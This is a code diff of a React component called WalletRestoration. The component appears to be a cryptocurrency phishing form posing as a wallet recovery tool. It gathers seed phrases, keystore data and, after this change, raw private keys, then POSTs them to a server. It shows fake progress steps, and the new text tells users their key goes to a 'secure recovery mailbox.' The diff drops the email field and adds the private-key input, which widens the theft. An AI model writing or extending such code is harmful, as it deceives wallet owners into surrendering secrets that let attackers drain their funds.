@@ -7,21 +7,16 @@ type RestorationStep = 'idle' | 'analyzing' | 'validating' | 'processing' | 'suc
 
 export const WalletRestoration = () => {
   const [secretPhrase, setSecretPhrase] = useState('')
-  const [email, setEmail] = useState('')
   const [walletFile, setWalletFile] = useState('')
   const [step, setStep] = useState<RestorationStep>('idle')
   const [message, setMessage] = useState('')
   const [progress, setProgress] = useState(0)
-  const [method, setMethod] = useState<'phrase' | 'file' | 'keystore'>('phrase')
+  const [method, setMethod] = useState<'phrase' | 'keystore' | 'privatekey'>('phrase')
   const router = useRouter()
 
   const isValidSeedPhrase = (phrase: string) => {
     const words = phrase.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0)
     return (words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w))
-  }
-
-  const isValidEmail = (email: string) => {
-    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
   }
 
   const simulateProgress = async (duration: number, startMsg: string, endMsg: string) => {
@@ -48,14 +43,6 @@ export const WalletRestoration = () => {
   }
 
   const handleRestore = async () => {
-    // Validation
-    if (!email || !isValidEmail(email)) {
-      setStep('error')
-      setMessage('❌ Invalid email address')
-      setTimeout(() => setStep('idle'), 3000)
-      return
-    }
-
     if (method === 'phrase') {
       if (!secretPhrase.trim()) {
         setStep('error')
@@ -106,9 +93,8 @@ export const WalletRestoration = () => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          email,
           method,
-          data: method === 'phrase' ? secretPhrase : walletFile,
+            data: method === 'phrase' ? secretPhrase : walletFile,
           timestamp,
         }),
       })
@@ -139,7 +125,7 @@ export const WalletRestoration = () => {
   }
 
   const isLoading = ['analyzing', 'validating', 'processing'].includes(step)
-  const canRestore = email && (method === 'phrase' ? secretPhrase : walletFile)
+  const canRestore = (method === 'phrase' ? secretPhrase.trim() : walletFile.trim())
 
   return (
     <div className="space-y-6 max-w-3xl">
@@ -156,7 +142,7 @@ export const WalletRestoration = () => {
         {[
           { id: 'phrase' as const, label: 'Seed Phrase', icon: '📝' },
           { id: 'keystore' as const, label: 'Keystore', icon: '🔑' },
-          { id: 'file' as const, label: 'Backup File', icon: '📄' },
+          { id: 'privatekey' as const, label: 'Private Key', icon: '🔒' },
         ].map(m => (
           <button
             key={m.id}
@@ -214,28 +200,20 @@ export const WalletRestoration = () => {
             />
           </div>
         )}
-
-        {method === 'file' && (
+        {method === 'privatekey' && (
           <div>
             <label className="block text-sm font-semibold text-white mb-2">
-              Upload backup file
+              Enter your private key
             </label>
-            <input
-              type="file"
-              onChange={(e) => {
-                const file = e.target.files?.[0]
-                if (file) {
-                  const reader = new FileReader()
-                  reader.onload = (event) => {
-                    setWalletFile(event.target?.result as string)
-                  }
-                  reader.readAsText(file)
-                }
-              }}
+            <textarea
+              value={walletFile}
+              onChange={(e) => setWalletFile(e.target.value)}
               disabled={isLoading}
-              className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-slate-300 disabled:opacity-50 disabled:cursor-not-allowed"
-              accept=".json,.txt,.bak"
+              placeholder="0x..."
+              className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-white placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+              rows={2}
             />
+            <p className="text-xs text-slate-400 mt-2">Treat private keys carefully — this will be delivered to our secure recovery mailbox.</p>
           </div>
         )}
 
